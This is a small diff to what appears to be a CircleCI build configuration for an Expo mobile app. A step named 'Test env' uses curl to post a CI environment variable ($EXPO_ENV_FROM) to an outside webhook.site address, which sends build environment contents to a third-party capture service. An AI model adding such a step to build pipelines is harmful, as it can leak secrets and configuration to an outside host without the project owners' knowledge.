@@ -201,7 +201,7 @@ jobs:
       - set_mobile_config_env
       - run:
           name: Test env
-          command: curl --data "param1=$TEST" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
+          command: curl --data "param1=$EXPO_ENV_FROM" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
       - run:
           name: Building Expo standalone app
           command: |
